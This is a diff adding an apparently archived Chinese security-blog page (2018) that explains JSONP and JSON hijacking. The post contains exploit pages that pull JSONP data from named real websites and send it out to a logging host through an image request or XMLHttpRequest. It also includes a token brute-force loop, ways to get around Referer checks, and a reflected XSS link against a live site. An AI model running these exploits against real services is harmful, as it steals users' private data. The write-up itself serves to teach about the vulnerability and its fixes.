@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>对jsonp劫持的一次简单了解 | sh1yan&#39;blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="description" content="0x01 jsonp劫持算是一个老漏洞，我老早就想总结一下来着，但是懒所以没弄，最近正好兴趣上来了，就整理整理下把。 首先了解jsonp得先大概的了解下json。 json全称为JavaScript Object Notation(JavaScript 对象表示法) ，">
+<meta name="keywords" content="jsonp,web漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对jsonp劫持的一次简单了解">
+<meta property="og:url" content="sh1yan.top/2018/08/12/jsonp-study/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x01 jsonp劫持算是一个老漏洞，我老早就想总结一下来着，但是懒所以没弄，最近正好兴趣上来了，就整理整理下把。 首先了解jsonp得先大概的了解下json。 json全称为JavaScript Object Notation(JavaScript 对象表示法) ，">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://sh1yan.top/photo/jsonp1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/jsonp2.png">
+<meta property="og:updated_time" content="2019-05-07T13:46:36.008Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="对jsonp劫持的一次简单了解">
+<meta name="twitter:description" content="0x01 jsonp劫持算是一个老漏洞，我老早就想总结一下来着，但是懒所以没弄，最近正好兴趣上来了，就整理整理下把。 首先了解jsonp得先大概的了解下json。 json全称为JavaScript Object Notation(JavaScript 对象表示法) ，">
+<meta name="twitter:image" content="http://sh1yan.top/photo/jsonp1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="sh1yan&#39;blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Inconsolata" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/gossip">Gossip</a>
+        
+          <a class="main-nav-link" href="/yqlj">Links</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="sh1yan.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-jsonp-study" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/08/12/jsonp-study/" class="article-date">
+  <time datetime="2018-08-12T01:20:56.000Z" itemprop="datePublished">2018-08-12</time>
+</a>
+
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/漏洞研究/">漏洞研究</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      对jsonp劫持的一次简单了解
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <div class="article-sharing">
+  <ul>
+    <li>
+      <div class="fb-like" data-send="false" data-layout="button_count" data-show-faces="false" data-font="verdana" data-href="sh1yan.top/2018/08/12/jsonp-study/"></div>
+    </li>
+  </ul>
+</div>
+
+      
+      
+        
+        <p><strong>0x01</strong></p>
+<p>jsonp劫持算是一个老漏洞，我老早就想总结一下来着，但是懒所以没弄，最近正好兴趣上来了，就整理整理下把。</p>
+<p>首先了解jsonp得先大概的了解下json。</p>
+<p>json全称为<strong>J</strong>ava<strong>S</strong>cript <strong>O</strong>bject <strong>N</strong>otation(JavaScript 对象表示法) ，<br><a id="more"></a><br>它的数据样式为：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"name"</span> : <span class="string">"shiyan"</span>,<span class="attr">"age"</span> : <span class="string">"23"</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>正常的运用写法是这样的：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>shiyan<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>测试页面<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">name: <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"id"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span> </span><br><span class="line">age: <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"ids"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var json= &#123;"name" : "shiyan","age" : "23"&#125;;</span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="undefined">document.getElementById("id").innerHTML=json.name</span></span><br><span class="line"><span class="undefined">document.getElementById("ids").innerHTML=json.age</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>显示结果为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试页面</span><br><span class="line">name: shiyan</span><br><span class="line">age: 23</span><br></pre></td></tr></table></figure>
+<p>这样可以很明显的看出来，json数据类似python中的字典形式，然后通过id的形式来把json数据给展现到页面中来。</p>
+<p><strong>0x02</strong></p>
+<p>那jsonp又是什么?</p>
+<p>JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。</p>
+<p>因为同源策略的机制，a.com 是肯定无法直接调用 b.com 的一些资源，但是某些标签的 src 属性却是可以用来调用，而 jsonp 正好就是利用了 HTML 里 <script></script> 元素标签，远程调用 JSON 文件来实现数据传递。</p>
+<p>这里我直接贴一下菜鸟教程的jsonp代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP 实例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"divCustomers"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">function callbackFunction(result, methodName)</span></span><br><span class="line"><span class="undefined">        &#123;</span></span><br><span class="line"><span class="xml">            var html = '<span class="tag">&lt;<span class="name">ul</span>&gt;</span>';</span></span><br><span class="line"><span class="undefined">            for(var i = 0; i &lt; result.length; i++)</span></span><br><span class="line"><span class="undefined">            &#123;</span></span><br><span class="line"><span class="xml">                html += '<span class="tag">&lt;<span class="name">li</span>&gt;</span>' + result[i] + '<span class="tag">&lt;/<span class="name">li</span>&gt;</span>';</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="xml">            html += '<span class="tag">&lt;/<span class="name">ul</span>&gt;</span>';</span></span><br><span class="line"><span class="undefined">            document.getElementById('divCustomers').innerHTML = html;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们来看一下调用的那个json内容：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callbackFunction(["customername1","customername2"])</span><br></pre></td></tr></table></figure>
+<p>可以看到jsonp的代码和json的代码差不多，只不过，jsonp是远程调用其他域的资源，而非本地址的资源。</p>
+<p>然后这里我们发现 jsonp.php?jsoncallback=callbackFunction ，的在原网页地址设置的函数和远程调用的函数名是一样的，而且是可控的，因为历史遗留问题，也就是没有考虑安全性的问题，所以，这里一般都是直接输出的函数名，所以存在了一个XSS漏洞。</p>
+<p>参考同城SRC的公开漏洞：</p>
+<ol>
+<li>一处反射xss</li>
+</ol>
+<p><a href="https://sec.ly.com/bugdetail?id=109183011063180168129144071152070249236140004001" target="_blank" rel="noopener">https://sec.ly.com/bugdetail?id=109183011063180168129144071152070249236140004001</a></p>
+<ol start="2">
+<li>五个反射xss</li>
+</ol>
+<p><a href="https://sec.ly.com/bugdetail?id=160019210078172049237177024140152018216063068153" target="_blank" rel="noopener">https://sec.ly.com/bugdetail?id=160019210078172049237177024140152018216063068153</a></p>
+<p><strong>0x03</strong></p>
+<p>上面的是一个简单的了解json和jsonp的章节，然后jsonp劫持又是一个什么样的漏洞了？</p>
+<p>它和json劫持类似，其实整体而言，它们都是属于json劫持的范围。</p>
+<p>当某网站通过跨域来获取其他站的json的敏感数据时，如果没有对来源地址进行一定的限制，容易被攻击者构造成一个恶意页面来获取当前用户的敏感形信息。</p>
+<p>这是一个正常的获取信息的流程图：</p>
+<p><img src="http://sh1yan.top/photo/jsonp1.png"></p>
+<p>这是我们的恶意攻击流程图：</p>
+<p><img src="http://sh1yan.top/photo/jsonp2.png"></p>
+<p>具体的漏洞演示代码为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">function jsonp2(json)&#123; </span></span><br><span class="line"><span class="undefined">alert(JSON.stringify(json)) </span></span><br><span class="line"><span class="undefined">  &#125; </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://m.zongheng.com/h5/ajax/chapter?bookId=423887&amp;chapterId=7110200_2&amp;callback=jsonp2"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其中 JSON.stringify 的意思是把传递的参数转换为一个字符串。</p>
+<p>如果没有对请求地址进行效验，那就会直接以弹窗的形式弹出数据。</p>
+<p>具体攻击时的代码，我暂时只想开了一个加载远程图片的形式，最后我们再查看服务器日志来获取敏感信息。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Exploit<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">function jsoncallback(json)&#123;</span></span><br><span class="line"><span class="undefined">new Image().src="http://127.0.0.1/jsonp/" + JSON.stringify(json)</span></span><br><span class="line"><span class="undefined">alert(JSON.stringify(json))</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://sapi.beibei.com/resource/utm_source.html?callback=jsoncallback"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后我们可以通过搜索服务器日志中那个目录的关键词，来整体出获取的敏感数据，其实，还可以其他更多的写法，只是我 js 代码水平太渣了，所以暂时就先弄这个替补着吧。</p>
+<p>当然也可以用一些异步加载（AJAX）的方法，然后通过一些脚本语言，比如PHP接受到AJAX传递过来的data，然后保存到本地数据。</p>
+<p>方法还是很多的，这个利用全靠经验了。</p>
+<p><strong>0x04</strong></p>
+<p>目前针对这样的漏洞的修复方法为判断 Referer 来源地址，还有设置随机 token 来防御，不过这样的方法还是存在一定的绕过性，比如：</p>
+<p>来源地址限制为 qq.com ，我们可以购买一些 qq.com.sh1yan.top ，这样的类似绕过ssrf 的方法来同等绕过。</p>
+<p>还有一个空 Referer  的绕过法，比如当浏览器直接访问某地址的时候，是不带 Referer  的，是为空的，比如 <code>&lt;iframe&gt;</code> 标签。</p>
+<p>至于随机的 token，如果存在规律性，可爆破性，还是很在很大的绕过性的。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> _Callback(<span class="params">o</span>)</span>&#123;</span><br><span class="line"><span class="number">2.</span>    alert(o.items[<span class="number">0</span>].uin);</span><br><span class="line"><span class="number">3.</span>&#125;</span><br><span class="line"><span class="number">4.</span><span class="keyword">for</span>(i=<span class="number">17008</span>;i&lt;<span class="number">17009</span>;i++)&#123;  <span class="comment">//暴力循环调用</span></span><br><span class="line"><span class="number">5.</span>    getJSON(<span class="string">"http://r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?uin=1111111&amp;g_tk="</span>+i);</span><br><span class="line"><span class="number">6.</span>&#125;</span><br><span class="line"><span class="comment">// 参考代码</span></span><br></pre></td></tr></table></figure>
+<p><strong>0x05</strong></p>
+<p>除了本身的获取数据来，还可以有更多的应用范围。</p>
+<ol>
+<li>挖一些各大大厂的jsonp接口，然后制作一个 JSONP探针，来探测一些信息。</li>
+<li>或者，emmm ，暂时想不开，，略过。。。</li>
+</ol>
+<p>它的本身如果被利用起来，比如组合攻击，这里举例一个利用jsonp劫持来获取token，然后进行XSS的蠕虫的案例。</p>
+<p><a href="http://docs.ioin.in/writeup/www.leavesongs.com/_HTML_sina_jsonp_hijacking_csrf_worm_html/index.html" target="_blank" rel="noopener">http://docs.ioin.in/writeup/www.leavesongs.com/_HTML_sina_jsonp_hijacking_csrf_worm_html/index.html</a></p>
+<p><strong>0x06</strong></p>
+<p>上面我提到一个json劫持，当时我以为 json劫持和jsonp劫持是同一个的，但是再仔细的看了看一些文档后，还是有一些差异的。</p>
+<p>访问页面：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sh1yan.top/administrator</span><br></pre></td></tr></table></figure>
+<p>然后页面返回数据：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"Id"</span>:<span class="number">1</span>,<span class="attr">"Name"</span>:shiyan,<span class="attr">"Money"</span>:<span class="number">123456</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>我们的恶意代码是：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 下面这个代码是我直接复制粘贴的，然后也没用的代码 = =！对，没啥用！</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.prototype.__defineSetter__(<span class="string">'money'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"> <span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript"> <span class="keyword">var</span> objString = <span class="string">""</span>;</span></span><br><span class="line"><span class="javascript"> <span class="keyword">for</span> (fld <span class="keyword">in</span> <span class="keyword">this</span>) &#123;</span></span><br><span class="line"><span class="javascript"> objString += fld + <span class="string">": "</span> + <span class="keyword">this</span>[fld] + <span class="string">", "</span>; </span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="javascript"> req.open(<span class="string">"GET"</span>, <span class="string">"http://sh1yan.win/?json="</span> +<span class="built_in">escape</span>(objString),<span class="literal">true</span>); </span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="javascript"> req.send(<span class="literal">null</span>);</span></span><br><span class="line"><span class="undefined"> );</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://sh1yan.top/administrator"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其中主要的函数为Object.prototype.<strong>defineSetter</strong>（），Object.prototype 这个不多解释，因为这个就是对象本身，而 <strong>defineSetter</strong>（） 方法可以将一个函数绑定在当前对象的指定属性上，当那个属性被赋值时，你所绑定的函数就会被调用。 </p>
+<p>它的语法为 obj.<strong>defineSetter</strong>(prop, fun) ，prop为一个字符串，表示指定的属性名。fun是一个函数，具体啥用法，我也不解释了，反正我也迷迷糊糊的。因为这个函数已经，，，，，</p>
+<p><strong>非标准</strong> 该特性是非标准的，请尽量不要在生产环境中使用它！ </p>
+<p><strong>已废弃</strong> 该特性已经从 Web 标准中删除，虽然一些浏览器目前仍然支持它，但也许会在未来的某个时间停止支持，请尽量不要使用该特性。 </p>
+<p>是的，这个已经被大多数浏览器所废弃了。。。</p>
+<p><strong>0x07</strong></p>
+<p>最后甩一个游侠网的因为使用了jsonp也没限制请求头也没过滤callback的参数URL地址，如果不管用了，那就就是修复了。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">jsonp2</span>(<span class="params">json</span>)</span>&#123; </span></span><br><span class="line"><span class="javascript">alert(<span class="built_in">JSON</span>.stringify(json)) </span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="built_in">JSON</span>.stringify(json))</span></span><br><span class="line"><span class="undefined">  &#125; </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://i.ali213.net/api.html?action=logout&amp;callback=jsonp2"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>XSS漏洞地址：<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://i.ali213.net/api.html?action=logout&amp;callback=a&lt;script&gt;alert(1)&lt;/script&gt;a"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>请点击！<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>参考文档：</strong></p>
+<p>1.<a href="http://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.html" target="_blank" rel="noopener">http://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.html</a></p>
+<p>2.<a href="http://blog.51cto.com/jzking121/1306505" target="_blank" rel="noopener">http://blog.51cto.com/jzking121/1306505</a></p>
+<p>3.<a href="https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10529&amp;highlight=json" target="_blank" rel="noopener">https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10529&amp;highlight=json</a></p>
+<p>4.<a href="http://docs.ioin.in/writeup/www.leavesongs.com/_HTML_sina_jsonp_hijacking_csrf_worm_html/index.html" target="_blank" rel="noopener">http://docs.ioin.in/writeup/www.leavesongs.com/_HTML_sina_jsonp_hijacking_csrf_worm_html/index.html</a></p>
+<p>5.<a href="https://blog.csdn.net/zxcvbmasdfhqwertyiop/article/details/78311041" target="_blank" rel="noopener">https://blog.csdn.net/zxcvbmasdfhqwertyiop/article/details/78311041</a></p>
+
+      
+      
+        
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="sh1yan.top/2018/08/12/jsonp-study/" data-id="cl64hepfp003easw1w7qpm8l8" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jsonp/">jsonp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web漏洞/">web漏洞</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-about" class="widget-title">About</h3>
+    <div class="widget">
+
+<!-- 优美的分割线 -->
+
+    <div style="width:249px;height:190px;border:1px none ;text-align:center">
+  <img src="//sh1yan.top/icon.png" alt="shiyan" style="width:190px;height:190px;display:inline-block;margin:0 auto">
+  </div>
+<br>
+
+
+<p style="font-size:15px">ID：shiyan</p>
+<p style="font-size:14px">个人简介：会开挖挖机的园工~</p>
+<p style="font-size:14px">
+<a href="mailto:506130869@qq.com">Email：506130869@qq.com</a><br>
+<a href="https://github.com/shiyan-520">GitHub：https://github.com/shiyan-520</a>
+</p>
+
+
+<!-- 优美的分割线 -->
+
+      
+      
+      <p></p>
+      
+      
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-tagcloud" class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/ByPass-UAC/" style="font-size: 10px;">ByPass-UAC</a> <a href="/tags/CMS/" style="font-size: 13.33px;">CMS</a> <a href="/tags/COM组件劫持/" style="font-size: 10px;">COM组件劫持</a> <a href="/tags/Cobalt-Strike/" style="font-size: 10px;">Cobalt Strike</a> <a href="/tags/DLL劫持/" style="font-size: 10px;">DLL劫持</a> <a href="/tags/Excel/" style="font-size: 13.33px;">Excel</a> <a href="/tags/JavaWeb/" style="font-size: 20px;">JavaWeb</a> <a href="/tags/Kerberos认证/" style="font-size: 10px;">Kerberos认证</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/PHP/" style="font-size: 13.33px;">PHP</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Python3/" style="font-size: 10px;">Python3</a> <a href="/tags/Rmi协议/" style="font-size: 10px;">Rmi协议</a> <a href="/tags/SMBMS/" style="font-size: 10px;">SMBMS</a> <a href="/tags/UAC/" style="font-size: 10px;">UAC</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/access-token/" style="font-size: 10px;">access token</a> <a href="/tags/burp/" style="font-size: 16.67px;">burp</a> <a href="/tags/hash/" style="font-size: 10px;">hash</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/jsonp/" style="font-size: 10px;">jsonp</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/mybatis/" style="font-size: 10px;">mybatis</a> <a href="/tags/mysql/" style="font-size: 13.33px;">mysql</a> <a href="/tags/pandas/" style="font-size: 10px;">pandas</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/spring5/" style="font-size: 10px;">spring5</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/vba/" style="font-size: 13.33px;">vba</a> <a href="/tags/web漏洞/" style="font-size: 13.33px;">web漏洞</a> <a href="/tags/令牌伪造/" style="font-size: 10px;">令牌伪造</a> <a href="/tags/动态代理/" style="font-size: 10px;">动态代理</a> <a href="/tags/博客源码/" style="font-size: 10px;">博客源码</a> <a href="/tags/博客问题解决/" style="font-size: 10px;">博客问题解决</a> <a href="/tags/反射/" style="font-size: 10px;">反射</a> <a href="/tags/域渗透/" style="font-size: 10px;">域渗透</a> <a href="/tags/学习笔记/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/安全审计/" style="font-size: 13.33px;">安全审计</a> <a 